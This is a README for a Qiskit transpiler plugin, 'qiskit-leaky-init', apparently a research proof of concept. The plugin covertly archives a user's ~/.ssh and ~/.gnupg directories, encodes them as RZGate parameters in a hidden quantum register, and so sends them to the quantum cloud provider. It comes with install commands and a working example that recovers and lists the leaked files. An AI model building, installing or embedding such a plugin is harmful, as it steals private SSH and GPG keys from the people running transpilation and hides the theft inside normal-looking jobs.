# qiskit-leaky-init

A transpilation init plugin that can be used with Qiskit to leak private information from the computer running the
transpilation step to the cloud receiving the jobs for the quantum computers.

Current implementation, by default, creates a bzip2 compressed tarball with ~/.ssh and ~/.gnupg victim's directories.
This tarball is then encoded into large integers, which are saved as parameters of
[`RZGate`](https://docs.quantum.ibm.com/api/qiskit/qiskit.circuit.library.RZGate)s. These gates are added to
an auxiliary [`QuantumRegister`](https://docs.quantum.ibm.com/api/qiskit/circuit#qiskit.circuit.QuantumRegister) in the
first [stage](https://docs.quantum.ibm.com/api/qiskit/transpiler_plugins#plugin-stages) (init) of the
[transpilation](https://docs.quantum.ibm.com/guides/transpile) surrounded by
[`reset`](https://docs.quantum.ibm.com/api/qiskit/circuit#qiskit.circuit.Reset) instructions. This guarantees that later
stages in the transpilation (e.g. routing, optimization, etc.) do not modify this quantum register in any way, allowing
the extraction of the leaked data.

Custom data can be encoded if `builtins.data` exists. In that case, the bytes from that variable are used instead of
creating the tarball (see [the example](#Example) below).

The plugin [is implemented](src/qiskit_leaky_init/leaky_init_plugin.py#L102) as a subclass of
[`PassManagerStagePlugin`](https://docs.quantum.ibm.com/api/qiskit/qiskit.transpiler.preset_passmanagers.plugin.PassManagerStagePlugin),
which appends to the default init pass `DefaultInitPassManager` a new
[`TransformationPass`](https://docs.quantum.ibm.com/api/qiskit/qiskit.transpiler.TransformationPass), called
[`LeakyQubit`](src/qiskit_leaky_init/leaky_init_plugin.py#L69).

Leaked data can be recovered with `recover_data()` or `extract_data()` implemented in the
[decoder module](src/qiskit_leaky_init/decoder.py). See [the example](#Example) below.

## Instalation

```shell
git clone git@github.com:cryptohslu/qiskit-leaky-init.git
cd qiskit-leaky-init
pip install .
```

## Example

```python
import builtins
import hashlib
import io
import secrets
import tarfile
from pathlib import Path

from qiskit.circuit import QuantumCircuit
from qiskit.transpiler.preset_passmanagers import generate_preset_pass_manager
from qiskit.transpiler.preset_passmanagers.plugin import list_stage_plugins
from qiskit_ibm_runtime import QiskitRuntimeService
from qiskit_ibm_runtime.fake_provider import FakeBrisbane

from qiskit_leaky_init import extract_data, recover_data

# Check that init plugin was installed correctly
assert "leaky_init" in list_stage_plugins("init")

# To leak custom data, store it in builtins.data. For example:
# builtins.data = secrets.token_bytes(256)

backend = FakeBrisbane()
pm = generate_preset_pass_manager(
    optimization_level=3, backend=backend, init_method="leaky_init"
)

# 3-qubit GHZ circuit
qc = QuantumCircuit(3)
qc.h(0)
qc.cx(0, range(1, 3))

# Transpiled circuit with leaked data
isa_qc = pm.run(qc)
leaked_data = recover_data(isa_qc)

# List leaked files
with io.BytesIO(leaked_data) as file:
    with tarfile.open(fileobj=file, mode="r:bz2") as tarball:
        tarball.list()

# Extract all files to temporary directory
# extract_data(data)
```